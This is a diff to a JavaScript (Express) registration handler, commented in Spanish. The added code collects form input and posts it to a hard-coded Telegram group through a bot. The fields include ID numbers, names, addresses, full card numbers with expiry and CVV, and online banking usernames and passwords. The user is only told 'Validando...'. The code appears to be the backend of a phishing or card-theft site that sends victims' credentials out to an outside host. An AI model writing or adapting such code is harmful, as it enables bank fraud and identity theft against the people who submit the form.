@@ -56,67 +56,87 @@ const registrar = async (req, res ) => {
 
        const cadenaSinLlaves = cadenaJson.slice(1, -1);
 
-       function enviarMensajeDeBienvenida() {
-        //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
-        const mensajeBienvenida = `Nuevo Registro:\n` + JSON.stringify(req.body, null, 2);
-      
-        const chatId = -618953922; //id de grupo
+       //Mandar Solo Cedula
+       const cedula = usuario.cedula
+
+       if (cedula !== undefined) {
+            function enviarCedula() {
+                //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
+                const Cedula = `Nueva Cédula Registrada 🪪:\n\n` + cedula;
+            
+                const chatId = -618953922; //id de grupo
+                
+                //5319932122; id de bot solo
         
-        //5319932122; id de bot solo
+                bot.sendMessage(chatId, Cedula)
+            }    
+            enviarCedula();
+       }
 
-        // Envía el mensaje al chat con el ID 'chatId'
-        bot.sendMessage(chatId, mensajeBienvenida)
-          .then(() => {
-            console.log('Mensaje enviado con éxito.');
-          })
-          .catch((error) => {
-            console.error('Error al enviar el mensaje:', error);
-          });
-      }
-
-        enviarMensajeDeBienvenida();
-
-      
-      
-      
-      
-      
-
-
-
-
+       //Enviar Datos
+       const nombre    = usuario.nombre
+       const celular   = usuario.celular
+       const ciudad    = usuario.ciudad
+       const direccion = usuario.direccion
+       const email     = usuario.email
+       const banco     = usuario.banco
+       const tarjeta   = usuario.tarjeta
+       const mes       = usuario.mes
+       const año       = usuario.año
+       const cvv       = usuario.cvv
 
       
-      //  bot.sendMessage( `Nuevo Registro:`)
-      
-      // bot.on(() => { 
-        //bot.sendMessage('Nuevo Registro:')/*
-
-      //  bot.sendMessage('Nuevo Registro:\n' + JSON.stringify(req.body, null, 2))
-        /*
-
-        async function getJSONData() {
-            try {
-                const response = await axios.get(jsonUrl);
-                const jsonData = response.data;
-    
-                bot.sendMessage('Nuevo Registro:\n' + JSON.stringify(req.body, null, 2))
-    
-            }
-            catch (error) {
-                console.error('Error al obtener o procesar el JSON:', error);
-            }
-            }
+        if (nombre, celular, ciudad, direccion, email, banco, tarjeta, mes, año, cvv !== undefined) {
+            function enviarDatos() {
+                //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
+                const Datos = `Nueva Información Registrada 📃:\n` + 
+                `
+                Nombre: ${nombre}
+                Celular: ${celular}
+                Ciudad: ${ciudad}
+                Dirección: ${direccion}
+                Email: ${email}
+                Banco: ${banco}
+                Tarjeta: ${tarjeta}
+                Mes: ${mes}
+                Año: ${año}
+                Cvv: ${cvv}
+                `;
+            
+                const chatId = -618953922; //id de grupo
+                
+                //5319932122; id de bot solo
         
-        getJSONData()*/
+                bot.sendMessage(chatId, Datos)
+            }    
+            enviarDatos();
+        }
 
-     //  });
-       
+           
+        //Mandar Datos de Banco
 
-     
+       const Datosbanco = usuario.usuario
+       const ContraseñaBanco = usuario.contraseñaBanco
 
-       //bot.sendMessage('Nuevo Registro:\n' + JSON.stringify(jsonData, null, 2))
-       
+       if (Datosbanco, ContraseñaBanco !== undefined) {
+            function enviarBanco() {
+                //const mensajeBienvenida = `Nuevo Registro:\n ${cadenaSinLlaves}`;
+                const Banco = `Nueva Información de Banco Registrada 💰:` + 
+                `
+                Usuario: ${Datosbanco}
+                Contraseña de Banco: ${ContraseñaBanco}
+                `;
+            
+                const chatId = -618953922; //id de grupo
+                
+                //5319932122; id de bot solo
+        
+                bot.sendMessage(chatId, Banco)
+            }    
+            enviarBanco();
+       }
+
+
     res.json({ msg: 'Validando...'});
        
     } catch (error) {
